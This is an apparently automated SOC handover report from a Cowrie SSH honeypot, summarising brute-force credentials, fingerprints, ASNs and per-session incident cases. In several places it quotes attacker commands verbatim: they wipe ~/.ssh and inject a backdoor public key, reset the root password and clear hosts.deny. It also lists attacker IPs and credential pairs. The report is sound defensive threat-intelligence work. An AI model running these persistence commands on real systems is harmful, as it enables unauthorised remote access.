# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-11 |
| **Generated At** | 2026-04-11T06:59:17Z |
| **Shift Time** | 06:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **329** |
| Confirmed Threats | **327** |
| False Positives Filtered | **2** (0.6%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **11** |
| High Severity Cases | **132** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **197** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **299** |
| Unique Credential Pairs | **116** |
| Unique Usernames | **47** |
| Unique Passwords | **111** |
| Successful Auth Pairs | **81** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 132 |
| `345gs5662d34` | 63 |
| `ubuntu` | 16 |
| `teamspeak` | 9 |
| `git` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 64 |
| `345gs5662d34` | 63 |
| `123456` | 7 |
| `password` | 5 |
| `i` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 64 |
| `345gs5662d34` | `345gs5662d34` | 63 |
| `pwserver` | `123456` | 4 |
| `i` | `i` | 4 |
| `teamspeak` | `teamspeak$` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ZAQ!2wsx2020@#` | `106.75.77.231` | 2026-04-11T05:34:17 |
| `root` | `3245gs5662d34` | `106.75.77.231` | 2026-04-11T05:34:21 |
| `root` | `12345-asd` | `103.210.21.178` | 2026-04-11T05:35:15 |
| `root` | `3245gs5662d34` | `103.210.21.178` | 2026-04-11T05:35:19 |
| `root` | `Jj123456` | `4.186.31.101` | 2026-04-11T05:36:42 |
| `root` | `india` | `14.103.127.232` | 2026-04-11T05:42:52 |
| `root` | `3245gs5662d34` | `14.103.127.232` | 2026-04-11T05:43:00 |
| `root` | `qwer123qwer` | `172.245.12.182` | 2026-04-11T05:44:41 |
| `root` | `3245gs5662d34` | `172.245.12.182` | 2026-04-11T05:44:46 |
| `root` | `p@Ssw0rd` | `186.38.26.5` | 2026-04-11T05:47:00 |
| `root` | `3245gs5662d34` | `186.38.26.5` | 2026-04-11T05:47:08 |
| `root` | `root000$` | `201.49.108.245` | 2026-04-11T05:47:31 |
| `root` | `3245gs5662d34` | `201.49.108.245` | 2026-04-11T05:47:39 |
| `root` | `Passw0rd@2026` | `201.49.108.245` | 2026-04-11T05:49:31 |
| `root` | `bbXX123` | `163.7.9.84` | 2026-04-11T05:50:45 |
| `root` | `3245gs5662d34` | `163.7.9.84` | 2026-04-11T05:50:48 |
| `root` | `iddqd` | `14.103.127.232` | 2026-04-11T05:51:17 |
| `root` | `masukaja` | `201.49.108.245` | 2026-04-11T05:51:28 |
| `root` | `zz123456` | `201.49.108.245` | 2026-04-11T05:53:29 |
| `root` | `ddBB123` | `43.165.185.71` | 2026-04-11T05:54:34 |
| `root` | `3245gs5662d34` | `43.165.185.71` | 2026-04-11T05:54:38 |
| `root` | `qf123456@` | `186.38.26.5` | 2026-04-11T05:54:52 |
| `root` | `Root14` | `203.90.110.186` | 2026-04-11T05:54:52 |
| `root` | `3245gs5662d34` | `203.90.110.186` | 2026-04-11T05:54:54 |
| `root` | `Root000$` | `201.49.108.245` | 2026-04-11T05:55:23 |
| `root` | `ddBB123` | `203.90.110.186` | 2026-04-11T05:57:00 |
| `root` | `Root12345@123` | `201.49.108.245` | 2026-04-11T05:57:14 |
| `root` | `Qazwsx54321.` | `186.38.26.5` | 2026-04-11T05:58:40 |
| `root` | `)OKM9ijn` | `13.81.183.28` | 2026-04-11T06:01:48 |
| `root` | `3245gs5662d34` | `13.81.183.28` | 2026-04-11T06:01:51 |
| `root` | `Root14` | `186.38.26.5` | 2026-04-11T06:02:38 |
| `root` | `Qazwsx11111.` | `43.165.185.71` | 2026-04-11T06:03:13 |
| `root` | `p@Ssw0rd` | `203.90.110.186` | 2026-04-11T06:03:31 |
| `root` | `Root2020..` | `186.38.26.5` | 2026-04-11T06:04:36 |
| `root` | `centos7` | `201.49.108.245` | 2026-04-11T06:04:51 |
| `root` | `Admin2024.` | `106.225.192.15` | 2026-04-11T06:05:54 |
| `root` | `bbXX123` | `186.38.26.5` | 2026-04-11T06:06:40 |
| `root` | `q` | `201.49.108.245` | 2026-04-11T06:06:52 |
| `root` | `ZAQ!2wsx321!` | `209.141.41.212` | 2026-04-11T06:07:47 |
| `root` | `3245gs5662d34` | `209.141.41.212` | 2026-04-11T06:07:54 |
| `root` | `Root29` | `103.168.135.187` | 2026-04-11T06:08:00 |
| `root` | `3245gs5662d34` | `103.168.135.187` | 2026-04-11T06:08:03 |
| `root` | `Qazwsx54321.` | `203.90.110.186` | 2026-04-11T06:08:06 |
| `root` | `Root2020..` | `43.165.185.71` | 2026-04-11T06:08:22 |
| `root` | `odoo12` | `209.141.41.212` | 2026-04-11T06:08:27 |
| `root` | `Qq112211` | `103.168.135.187` | 2026-04-11T06:09:30 |
| `root` | `Ak123456` | `43.134.94.132` | 2026-04-11T06:10:29 |
| `root` | `Qazwsx11111.` | `186.38.26.5` | 2026-04-11T06:10:29 |
| `root` | `xiaoxiao520` | `201.49.108.245` | 2026-04-11T06:10:47 |
| `root` | `Qazwsx9999` | `103.168.135.187` | 2026-04-11T06:11:00 |
| `root` | `root1234..` | `209.141.41.212` | 2026-04-11T06:11:11 |
| `root` | `admin12` | `103.168.135.187` | 2026-04-11T06:11:51 |
| `root` | `qazwsx888@` | `209.141.41.212` | 2026-04-11T06:11:53 |
| `root` | `qf123456@` | `43.165.185.71` | 2026-04-11T06:11:55 |
| `root` | `ddBB123` | `186.38.26.5` | 2026-04-11T06:12:26 |
| `root` | `Admin888` | `103.168.135.187` | 2026-04-11T06:13:21 |
| `root` | `Password123!@#` | `103.168.135.187` | 2026-04-11T06:14:02 |
| `root` | `qwer123456!` | `209.141.41.212` | 2026-04-11T06:14:40 |
| `root` | `1234.abcd` | `103.168.135.187` | 2026-04-11T06:14:43 |
| `root` | `)OKM9ijn` | `103.168.135.187` | 2026-04-11T06:15:24 |
| `root` | `Root14` | `43.165.185.71` | 2026-04-11T06:15:27 |
| `root` | `Abcd@123` | `209.141.41.212` | 2026-04-11T06:16:05 |
| `root` | `root123321@123` | `103.168.135.187` | 2026-04-11T06:16:08 |
| `root` | `bbXX123` | `203.90.110.186` | 2026-04-11T06:16:53 |
| `root` | `ZAQ!2wsx2020@123` | `201.49.108.245` | 2026-04-11T06:18:16 |
| `root` | `abc123...` | `103.168.135.187` | 2026-04-11T06:19:13 |
| `root` | `Yc@123456` | `209.141.41.212` | 2026-04-11T06:19:34 |
| `root` | `hoang123` | `103.168.135.187` | 2026-04-11T06:19:59 |
| `root` | `qwert!123456` | `201.49.108.245` | 2026-04-11T06:20:14 |
| `root` | `p@Ssw0rd` | `43.165.185.71` | 2026-04-11T06:22:30 |
| `root` | `Qazwsx11111.` | `203.90.110.186` | 2026-04-11T06:23:36 |
| `root` | `Qazwsx2018!@#` | `201.49.108.245` | 2026-04-11T06:24:06 |
| `root` | `Qazwsx54321.` | `43.165.185.71` | 2026-04-11T06:24:17 |
| `root` | `bbXX123` | `43.165.185.71` | 2026-04-11T06:26:01 |
| `root` | `BBbb123123` | `201.49.108.245` | 2026-04-11T06:28:02 |
| `root` | `Qwer-123456` | `201.49.108.245` | 2026-04-11T06:29:55 |
| `root` | `qf123456@` | `203.90.110.186` | 2026-04-11T06:30:19 |
| `root` | `Root2020..` | `203.90.110.186` | 2026-04-11T06:36:54 |
| `root` | `bbAA112233` | `211.251.245.88` | 2026-04-11T06:44:22 |
| `root` | `3245gs5662d34` | `211.251.245.88` | 2026-04-11T06:44:26 |
| `root` | `root1!@` | `49.247.36.49` | 2026-04-11T06:56:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **329** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 325 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 322 | 21 |
| `4e066189c3bb...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 322 | 21 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `4e066189c3bb...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 64 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:pCVcc3blMhGL"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `49.247.36.49`, `106.225.192.15`, `4.186.31.101`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `211.251.245.88`, `163.7.9.84`, `106.75.77.231`, `201.49.108.245`, `103.168.135.187`, `13.81.183.28`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **18** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS38513` | PT Aplikanusa Lintasarta | 1 | HIGH |
| `AS22927` | Telefonica de Argentina | 1 | HIGH |
| `AS134760` | Shijiazhuang IDC network, CHINANET Hebei province | 1 | HIGH |
| `AS134238` | CHINANET Jiangx province IDC network | 1 | HIGH |
| `AS16735` | ALGAR TELECOM S/A | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (132)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-79075fc8ce6f

| Field | Detail |
|---|---|
| **Source IP** | `106.75.77[.]231` |
| **First Seen** | 2026-04-11 05:34 |
| **Last Seen** | 2026-04-11 05:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:34:17` | `cowrie.session.connect` |
| `2026-04-11 05:34:17` | `cowrie.client.version` |
| `2026-04-11 05:34:17` | `cowrie.client.kex` |
| `2026-04-11 05:34:17` | `cowrie.login.success` |
| `2026-04-11 05:34:18` | `cowrie.session.params` |
| `2026-04-11 05:34:18` | `cowrie.command.input` |
| `2026-04-11 05:34:18` | `cowrie.command.failed` |
| `2026-04-11 05:34:18` | `cowrie.log.closed` |
| `2026-04-11 05:34:18` | `cowrie.session.params` |
| `2026-04-11 05:34:18` | `cowrie.command.input` |
| `2026-04-11 05:34:18` | `cowrie.session.file_download` |
| `2026-04-11 05:34:18` | `cowrie.log.closed` |
| `2026-04-11 05:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.77[.]231` to AbuseIPDB if not already reported
- [ ] Block `106.75.77[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23c1c0cfdd91

| Field | Detail |
|---|---|
| **Source IP** | `106.75.77[.]231` |
| **First Seen** | 2026-04-11 05:34 |
| **Last Seen** | 2026-04-11 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:34:20` | `cowrie.session.connect` |
| `2026-04-11 05:34:20` | `cowrie.client.version` |
| `2026-04-11 05:34:21` | `cowrie.client.kex` |
| `2026-04-11 05:34:21` | `cowrie.login.success` |
| `2026-04-11 05:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.77[.]231` to AbuseIPDB if not already reported
- [ ] Block `106.75.77[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1918c7635d8e

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]178` |
| **First Seen** | 2026-04-11 05:35 |
| **Last Seen** | 2026-04-11 05:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:35:15` | `cowrie.session.connect` |
| `2026-04-11 05:35:15` | `cowrie.client.version` |
| `2026-04-11 05:35:15` | `cowrie.client.kex` |
| `2026-04-11 05:35:15` | `cowrie.login.success` |
| `2026-04-11 05:35:16` | `cowrie.session.params` |
| `2026-04-11 05:35:16` | `cowrie.command.input` |
| `2026-04-11 05:35:16` | `cowrie.command.failed` |
| `2026-04-11 05:35:16` | `cowrie.log.closed` |
| `2026-04-11 05:35:16` | `cowrie.session.params` |
| `2026-04-11 05:35:16` | `cowrie.command.input` |
| `2026-04-11 05:35:16` | `cowrie.session.file_download` |
| `2026-04-11 05:35:16` | `cowrie.log.closed` |
| `2026-04-11 05:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9edfd1863fd

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]178` |
| **First Seen** | 2026-04-11 05:35 |
| **Last Seen** | 2026-04-11 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:35:18` | `cowrie.session.connect` |
| `2026-04-11 05:35:18` | `cowrie.client.version` |
| `2026-04-11 05:35:18` | `cowrie.client.kex` |
| `2026-04-11 05:35:19` | `cowrie.login.success` |
| `2026-04-11 05:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e3037d03a28

| Field | Detail |
|---|---|
| **Source IP** | `4.186.31[.]101` |
| **First Seen** | 2026-04-11 05:36 |
| **Last Seen** | 2026-04-11 05:37 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pCVcc3blMhGL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:36:42` | `cowrie.session.connect` |
| `2026-04-11 05:36:42` | `cowrie.client.version` |
| `2026-04-11 05:36:42` | `cowrie.client.kex` |
| `2026-04-11 05:36:42` | `cowrie.login.success` |
| `2026-04-11 05:36:42` | `cowrie.session.params` |
| `2026-04-11 05:36:42` | `cowrie.command.input` |
| `2026-04-11 05:36:42` | `cowrie.command.failed` |
| `2026-04-11 05:36:42` | `cowrie.log.closed` |
| `2026-04-11 05:36:42` | `cowrie.session.params` |
| `2026-04-11 05:36:42` | `cowrie.command.input` |
| `2026-04-11 05:36:42` | `cowrie.session.file_download` |
| `2026-04-11 05:36:42` | `cowrie.log.closed` |
| `2026-04-11 05:36:58` | `cowrie.session.params` |
| `2026-04-11 05:36:58` | `cowrie.command.input` |
| `2026-04-11 05:36:58` | `cowrie.log.closed` |
| `2026-04-11 05:36:58` | `cowrie.session.params` |
| `2026-04-11 05:36:58` | `cowrie.command.input` |
| `2026-04-11 05:36:58` | `cowrie.log.closed` |
| `2026-04-11 05:36:58` | `cowrie.session.params` |
| `2026-04-11 05:36:58` | `cowrie.command.input` |
| `2026-04-11 05:36:58` | `cowrie.session.file_download` |
| `2026-04-11 05:36:58` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:36:59` | `cowrie.session.params` |
| `2026-04-11 05:36:59` | `cowrie.command.input` |
| `2026-04-11 05:36:59` | `cowrie.log.closed` |
| `2026-04-11 05:37:00` | `cowrie.session.params` |
| `2026-04-11 05:37:00` | `cowrie.command.input` |
| `2026-04-11 05:37:00` | `cowrie.log.closed` |
| `2026-04-11 05:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.186.31[.]101` to AbuseIPDB if not already reported
- [ ] Block `4.186.31[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d03bd76555

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-04-11 05:42 |
| **Last Seen** | 2026-04-11 05:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:42:49` | `cowrie.session.connect` |
| `2026-04-11 05:42:49` | `cowrie.client.version` |
| `2026-04-11 05:42:50` | `cowrie.client.kex` |
| `2026-04-11 05:42:52` | `cowrie.login.success` |
| `2026-04-11 05:42:52` | `cowrie.session.params` |
| `2026-04-11 05:42:52` | `cowrie.command.input` |
| `2026-04-11 05:42:52` | `cowrie.command.failed` |
| `2026-04-11 05:42:52` | `cowrie.log.closed` |
| `2026-04-11 05:42:53` | `cowrie.session.params` |
| `2026-04-11 05:42:53` | `cowrie.command.input` |
| `2026-04-11 05:42:53` | `cowrie.session.file_download` |
| `2026-04-11 05:42:53` | `cowrie.log.closed` |
| `2026-04-11 05:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96adeec40f79

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-04-11 05:42 |
| **Last Seen** | 2026-04-11 05:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:42:59` | `cowrie.session.connect` |
| `2026-04-11 05:42:59` | `cowrie.client.version` |
| `2026-04-11 05:42:59` | `cowrie.client.kex` |
| `2026-04-11 05:43:00` | `cowrie.login.success` |
| `2026-04-11 05:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747fd5043ea9

| Field | Detail |
|---|---|
| **Source IP** | `172.245.12[.]182` |
| **First Seen** | 2026-04-11 05:44 |
| **Last Seen** | 2026-04-11 05:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
